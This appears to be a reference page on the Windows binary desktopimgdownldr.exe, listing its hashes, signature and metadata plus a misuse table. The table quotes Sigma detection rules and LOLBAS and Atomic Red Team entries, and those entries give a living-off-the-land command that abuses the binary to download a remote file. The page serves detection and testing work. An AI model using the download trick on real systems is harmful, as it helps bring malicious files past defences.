---
title: desktopimgdownldr.exe | desktopimgdownldr.exe
excerpt: What is desktopimgdownldr.exe?
---

# desktopimgdownldr.exe 

* File Path: `C:\WINDOWS\system32\desktopimgdownldr.exe`
* Description: desktopimgdownldr.exe

## Hashes

Type | Hash
-- | --
MD5 | `0E8109FF251EE8C467F3F3641A2AFDDB`
SHA1 | `00E8D06BD13E4C12A5AD1B3E5B68E8A012FE2491`
SHA256 | `AAADA36880E08C0B37ED6A1F6FF605144C650D987C0F8049347E9DD5A04CDB4E`
SHA384 | `5B08CAB01899FA32A2DA507D98D2101EC54C970EE365C59068AC8C8EDC91457938A534EE9C05E34ABE36AE79C69C5978`
SHA512 | `6F6B03B8AF1B6CE81483994899917686B9A09B7F54BA694D9B3DA656BA3E36D6B142AD5A1828F9C2163E9BF0CCFE72E9D506F30A2584A991FAE7848767DF8750`
SSDEEP | `1536:hAN+bWaVooo4ooPMf8uolZlaEUuYUK1aZT7nV:xLSNdoPk8Fl2EdYHU57nV`

## Signature

* Status: Signature verified.
* Serial: `330000023241FB59996DCC4DFF000000000232`
* Thumbprint: `FF82BC38E1DA5E596DF374C53E3617F7EDA36B06`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: desktopimgdownldr.exe
* Product Name: Microsoft Windows Operating System
* Company Name: Microsoft Corporation
* File Version: 10.0.18362.1 (WinBuild.160101.0800)
* Product Version: 10.0.18362.1
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.



## Possible Misuse

*The following table contains possible examples of `desktopimgdownldr.exe` being misused. While `desktopimgdownldr.exe` is **not** inherently malicious, its legitimate functionality can be abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_desktopimgdownldr_file.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/file_event/win_susp_desktopimgdownldr_file.yml) | `title: Suspicious Desktopimgdownldr Target File`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_desktopimgdownldr_file.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/file_event/win_susp_desktopimgdownldr_file.yml) | `description: Detects a suspicious Microsoft desktopimgdownldr file creation that stores a file to a suspicious location or contains a file with a suspicious extension`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_copy_system32.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_copy_system32.yml) | `description: Detects a suspicious copy command that copies a system program from System32 to another directory on disk - sometimes used to use LOLBINs like certutil or desktopimgdownldr to a different location with a different name`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_desktopimgdownldr.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_desktopimgdownldr.yml) | `title: Suspicious Desktopimgdownldr Command`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_desktopimgdownldr.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_desktopimgdownldr.yml) | `description: Detects a suspicious Microsoft desktopimgdownldr execution with parameters used to download files from the Internet`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Desktopimgdownldr.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Desktopimgdownldr.yml) | `Name: Desktopimgdownldr.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Desktopimgdownldr.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Desktopimgdownldr.yml) | `- Command: set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://domain.com:8080/file.ext /eventName:desktopimgdownldr`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Desktopimgdownldr.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Desktopimgdownldr.yml) | `- Path: c:\windows\system32\desktopimgdownldr.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Desktopimgdownldr.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Desktopimgdownldr.yml) | `- IOC: desktopimgdownldr.exe that creates non-image file`{:.highlight .language-yaml} | 
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md) | - Atomic Test #4: Bits download using desktopimgdownldr.exe (cmd) [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [windows-index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/windows-index.md) | - Atomic Test #4: Bits download using desktopimgdownldr.exe (cmd) [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1197.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1197/T1197.md) | - [Atomic Test #4 - Bits download using desktopimgdownldr.exe (cmd)](#atomic-test-4---bits-download-using-desktopimgdownldrexe-cmd) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1197.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1197/T1197.md) | ## Atomic Test #4 - Bits download using desktopimgdownldr.exe (cmd) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1197.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1197/T1197.md) | This test simulates using desktopimgdownldr.exe to download a malicious file | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1197.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1197/T1197.md) | and not desktopimgdownldr.exe. See https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/ | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1197.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1197/T1197.md) | set "#{download_path}" && cmd /c desktopimgdownldr.exe /lockscreenurl:#{remote_file} /eventName:desktopimgdownldr | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)



MIT License. Copyright (c) 2020-2021 Strontic.


